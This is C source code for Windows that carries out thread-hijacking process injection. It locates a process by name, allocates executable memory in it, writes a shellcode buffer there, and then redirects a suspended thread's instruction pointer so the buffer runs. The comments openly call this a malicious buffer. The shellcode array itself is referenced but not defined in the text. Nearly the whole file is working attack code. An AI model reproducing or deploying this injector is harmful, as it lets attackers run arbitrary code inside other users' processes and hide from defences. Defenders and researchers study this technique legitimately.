#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>

DWORD GetProcessIdByName(const TCHAR *processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (_tcscmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return 0; // Process not found
}

void InjectAndHijackThread(const TCHAR *processName) {
    // Get the target process ID by name
    DWORD processId = GetProcessIdByName(processName);

    if (processId == 0) {
        _tprintf(TEXT("Process %s not found.\n"), processName);
        return;
    }

    // Step 1: Open the target process with all access rights.
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Requests all possible access rights
        FALSE, // Child processes do not inherit parent process handle
        processId // Stored process ID
    );

    if (hProcess == NULL) {
        _tprintf(TEXT("Failed to open process %s.\n"), processName);
        return;
    }

    // Step 2: Allocate memory in the target process for the shellcode.
    PVOID remoteBuffer = VirtualAllocEx(
        hProcess, // Opened target process
        NULL,
        sizeof(shellcode), // Region size of memory allocation
        (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
        PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
    );

    if (remoteBuffer == NULL) {
        _tprintf(TEXT("Failed to allocate memory in process %s.\n"), processName);
        CloseHandle(hProcess);
        return;
    }

    // Step 3: Write the shellcode into the allocated memory in the target process.
    if (!WriteProcessMemory(
            hProcess, // Opened target process
            remoteBuffer, // Allocated memory region
            shellcode, // Data to write
            sizeof(shellcode), // Byte size of data
            NULL)) {
        _tprintf(TEXT("Failed to write shellcode in process %s.\n"), processName);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Step 4: Create a snapshot of all threads in the system to find the target thread.
    THREADENTRY32 threadEntry;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, // Include all processes residing on the system
        0 // Indicates the current process
    );

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("Failed to create thread snapshot.\n"));
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Step 5: Loop through the snapshot to find the thread associated with the target process.
    threadEntry.dwSize = sizeof(THREADENTRY32);
    HANDLE hThread = NULL;

    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                // Step 6: Open the target thread with all access rights.
                hThread = OpenThread(
                    THREAD_ALL_ACCESS, // Requests all possible access rights
                    FALSE, // Child threads do not inherit parent thread handle
                    threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
                );

                if (hThread != NULL) {
                    // Step 7: Suspend the target thread.
                    SuspendThread(hThread);

                    // Step 8: Get the context of the target thread.
                    CONTEXT context;
                    context.ContextFlags = CONTEXT_FULL; // Specify which parts of the context to retrieve
                    if (GetThreadContext(hThread, &context)) {
                        // Step 9: Set the instruction pointer (RIP) to point to our malicious buffer allocation.
                        context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation

                        // Step 10: Set the updated context to the target thread.
                        SetThreadContext(hThread, &context);

                        // Step 11: Resume the target thread to execute the shellcode.
                        ResumeThread(hThread);
                    } else {
                        _tprintf(TEXT("Failed to get thread context.\n"));
                    }

                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &threadEntry));
    }

    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
}
